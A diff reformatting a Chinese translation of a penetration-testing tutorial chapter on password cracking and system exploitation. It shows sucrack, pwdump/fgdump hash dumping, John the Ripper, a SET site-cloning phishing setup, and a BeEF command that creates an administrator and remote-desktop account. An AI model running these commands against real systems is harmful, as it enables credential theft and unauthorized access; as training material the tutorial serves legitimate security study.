@@ -1,4 +1,4 @@
-# 第八章。系统和密码利用
+# 第八章：系统和密码利用
 
 在本章中，我们将涵盖以下内容：
 
@@ -29,9 +29,9 @@
 1.  出于演示目的，我们已将密码更改为`987654321`。输入以下命令开始 sucrack 攻击：
 
 ```
-          sucrack -a -w 10 -s 3 -u root /usr/share/wordlists/rockyou.txt
+      sucrack -a -w 10 -s 3 -u root /usr/share/wordlists/rockyou.txt
 
-    ```
+```
 
 输出将如下屏幕截图所示：
 
@@ -50,9 +50,9 @@
 1.  在终端中输入以下命令：
 
 ```
-          PWDump.exe -o test 127.0.0.1
+      PWDump.exe -o test 127.0.0.1
 
-    ```
+```
 
 输出将如下屏幕截图所示：
 
@@ -65,9 +65,9 @@
 1.  现在让我们来看看 fgdump 及其工作原理。在我们继续之前，我们需要知道 fgdump 是 pwdump 的更新版本；它具有显示密码历史记录的附加功能（如果可用）。在命令提示符中输入以下命令：
 
 ```
-          fgdump.exe
+      fgdump.exe
 
-    ```
+```
 
 输出将如下屏幕截图所示：
 
@@ -126,9 +126,9 @@ sucrack、pwdump 和 fgdump 中还有更多可以探索的选项。只需在各�
 1.  在终端中输入以下命令：
 
 ```
-    john crackme
+john crackme
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -165,9 +165,9 @@ John the Ripper 是一个智能工具；它可以检测使用的加密类型，�
 1.  使用以下命令启动社会工程工具包：
 
 ```
-    Setoolkit
+Setoolkit
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -184,17 +184,17 @@ John the Ripper 是一个智能工具；它可以检测使用的加密类型，�
 1.  之后，我们将克隆该网站并填写必要的信息：
 
 ```
-          set:webattack>2
-          [-] NAT/Port Forwarding can be used in the cases where your SET       machine is
-          [-] not externally exposed and may be a different IP address       than your reverse listener.
-          set> Are you using NAT/Port Forwarding [yes|no]: yes
-          set:webattack> IP address to SET web server (this could be your        external IP or hostname):192.168.157.157
-          set:webattack> Is your payload handler (metasploit) on a       different IP from your external NAT/Port FWD address [yes|no]:no
-          [-] SET supports both HTTP and HTTPS
-          [-] Example: http://www.thisisafakesite.com
-          set:webattack> Enter the url to clone:http://security-geek.in
+      set:webattack>2
+      [-] NAT/Port Forwarding can be used in the cases where your SET       machine is
+      [-] not externally exposed and may be a different IP address       than your reverse listener.
+      set> Are you using NAT/Port Forwarding [yes|no]: yes
+      set:webattack> IP address to SET web server (this could be your        external IP or hostname):192.168.157.157
+      set:webattack> Is your payload handler (metasploit) on a       different IP from your external NAT/Port FWD address [yes|no]:no
+      [-] SET supports both HTTP and HTTPS
+      [-] Example: http://www.thisisafakesite.com
+      set:webattack> Enter the url to clone:http://security-geek.in
 
-    ```
+```
 
 同样的截图如下所示：
 
@@ -239,10 +239,10 @@ BeEF XSS 已经是 Kali Linux 的一部分。在这个练习中，我们使用�
 1.  通过在终端中输入以下内容来启动 BeEF 框架：
 
 ```
-          cd /usr/share/beef
-          ./beef
+      cd /usr/share/beef
+      ./beef
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -269,9 +269,9 @@ BeEF XSS 已经是 Kali Linux 的一部分。在这个练习中，我们使用�
 在**ActiveX Command Execution**中，设置命令如下：
 
 ```
-          cmd.exe /c "net user beefed beef@123 /add &  net localgroup        Administrators beefed /add & net localgroup "Remote desktop       users" beefed /add & pause"
+      cmd.exe /c "net user beefed beef@123 /add &  net localgroup        Administrators beefed /add & net localgroup "Remote desktop       users" beefed /add & pause"
 
-    ```
+```
 
 设置相同的选项如下截图所示：
 
@@ -280,9 +280,9 @@ BeEF XSS 已经是 Kali Linux 的一部分。在这个练习中，我们使用�
 1.  我们现在将尝试使用 Kali 中的`rdesktop`命令对远程系统进行远程桌面连接。输入用户名、密码和 IP 以连接到机器：
 
 ```
-          rdesktop -u beefed -p "beef@123" 192.168.157.155
+      rdesktop -u beefed -p "beef@123" 192.168.157.155
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -311,9 +311,9 @@ BeEF 是一个很棒的客户端渗透测试工具。在大多数情况下，我
 1.  首先，从 Ophcrack sourceforge 表中下载`tables_xp_free_fast`文件，并将其放入您的 Kali 机器中。使用以下命令解压缩它：
 
 ```
-    Unzip tables_xp_free_fast.zip
+Unzip tables_xp_free_fast.zip
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -322,9 +322,9 @@ BeEF 是一个很棒的客户端渗透测试工具。在大多数情况下，我
 1.  我们已经从被入侵的 XP 机器中获得了要使用的哈希值。现在，要使用先前的彩虹表运行 Ophcrack，使用以下命令：
 
 ```
-    Ophcrack
+Ophcrack
 
-    ```
+```
 
 现在将加载一个看起来像以下截图的 GUI。使用任何哈希转储方法加载检索到的密码哈希。在这种情况下，使用 pwdump：
 
